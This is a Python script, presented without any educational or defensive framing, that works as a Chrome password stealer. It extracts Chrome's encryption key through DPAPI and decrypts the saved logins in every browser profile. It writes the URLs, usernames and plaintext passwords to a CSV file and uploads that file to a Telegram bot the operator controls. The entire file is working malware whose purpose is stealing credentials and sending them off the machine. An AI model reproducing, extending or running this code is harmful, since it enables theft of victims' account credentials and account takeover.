import os
import re
import requests
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
from dotenv import load_dotenv

class ChromePasswordDumper:
    def __init__(self):
        load_dotenv()
        self.api_token = os.getenv('API_TOKEN')
        self.chat_id = os.getenv('CHAT_ID')
        self.chrome_path_local_state = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        self.chrome_path = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
    
    def get_secret_key(self):
        try:
            with open(self.chrome_path_local_state, "r", encoding='utf-8') as f:
                local_state = json.load(f)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("[ERR] Chrome secret key cannot be found:", e)
            return None

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            return decrypted_pass.decode()
        except Exception as e:
            print("[ERR] Unable to decrypt password:", e)
            return ""

    def get_db_connection(self, chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("[ERR] Chrome database cannot be found:", e)
            return None

    def send_file(self, file_path):
        url = f"https://api.telegram.org/bot{self.api_token}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': self.chat_id}
            response = requests.post(url, files=files, data=data)
            return response.json()

    def dump_passwords(self):
        try:
            # Open csv file to write
            with open('decrypted_password_chrome.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index", "url", "username", "password"])
                secret_key = self.get_secret_key()  
                folders = [element for element in os.listdir(self.chrome_path) if re.search("^Profile*|^Default$", element) is not None]

                for folder in folders:
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (self.chrome_path, folder))
                    conn = self.get_db_connection(chrome_path_login_db)
                    if secret_key and conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                        for index, login in enumerate(cursor.fetchall()):
                            url, username, ciphertext = login
                            if url and username and ciphertext:
                                decrypted_password = self.decrypt_password(ciphertext, secret_key)
                                print(f"Sequence: {index}\nURL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}")
                                csv_writer.writerow([index, url, username, decrypted_password])  # Write data to csv

                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")  

            # Send to telegram
            if os.path.exists('decrypted_password_chrome.csv'):
                response = self.send_file('decrypted_password_chrome.csv')  
                print('File sent:', response)  
            else:
                print("[ERR] File not found: decrypted_password.csv")
        except Exception as e:
            print("[ERR]", e)


if __name__ == '__main__':
    dumper = ChromePasswordDumper()
    dumper.dump_passwords()
